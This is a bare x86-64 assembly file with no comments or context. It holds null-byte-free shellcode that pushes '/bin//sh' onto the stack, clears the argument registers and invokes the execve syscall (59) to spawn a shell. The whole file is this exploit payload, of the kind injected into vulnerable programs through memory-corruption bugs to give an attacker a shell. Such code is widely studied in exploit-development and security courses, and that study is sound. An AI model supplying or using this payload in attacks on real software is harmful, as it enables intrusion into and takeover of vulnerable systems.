BITS 64

global _start

_start:
	xor 	rsi, rsi
	push 	rsi
	mov 	rdi, 0x68732f2f6e69622f
	push 	rdi
	mov     rdi, rsp
	mov 	rax, 59
	cdq
	syscall
